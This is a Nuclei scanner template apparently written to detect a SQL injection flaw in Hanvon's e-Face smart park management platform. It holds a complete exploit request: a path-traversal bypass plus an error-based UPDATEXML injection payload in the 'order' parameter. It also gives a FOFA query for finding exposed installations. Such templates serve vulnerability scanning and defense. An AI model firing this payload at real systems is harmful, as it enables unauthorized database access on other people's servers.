id: poc-yaml-hw-e-face-pass-spmp-querymeetingfile-do-sqli
info:
  name: 汉王e脸通智慧园区管理平台 queryMeetingFile.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: e脸通智慧园区管理平台
    fofa-query: "icon_hash=\"1380907357\""

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /manage/intercom/..;/..;/manage/meeting/queryMeetingFile.do?page=1&pageSize=10&mtId=1&order=(UPDATEXML(2920,CONCAT(0x2e,md5({{t1}}),(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
        Accept: */*
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "{{t2}}"
